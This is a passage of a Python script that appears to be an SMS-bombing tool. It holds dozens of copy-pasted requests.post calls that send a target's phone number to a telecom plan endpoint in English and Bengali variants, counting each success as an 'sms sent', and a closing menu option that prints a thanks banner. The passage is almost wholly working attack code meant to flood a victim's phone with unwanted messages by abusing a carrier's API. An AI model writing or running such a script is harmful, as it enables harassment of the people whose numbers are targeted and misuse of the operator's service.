					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":700,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":800,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":900,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1000,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1100,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					
					
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":600,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":700,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":800,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":900,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1000,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1100,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":600,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":700,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":800,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":900,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1000,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1100,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					
					
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":600,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":700,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":800,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":900,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1000,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1100,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":600,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":700,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":800,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":900,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1000,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1100,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					
					
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":600,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":700,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":800,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":900,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1000,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1100,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":600,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":700,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":800,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":900,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1000,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1100,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":1500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					
					
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":600,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":700,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":800,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":900,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1000,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1100,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":1500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					if resp.status_code==200:
						i+=1
						print(green+f'  [√] {i} sms sent')
				else:
						print(red+'   [×] Sms Not sent')
	
							
if inp_option==4:
	thanks="""	  ------------------------------------
	
		Thanks For Connecting US 
		
	  ------------------------------------ """
	
		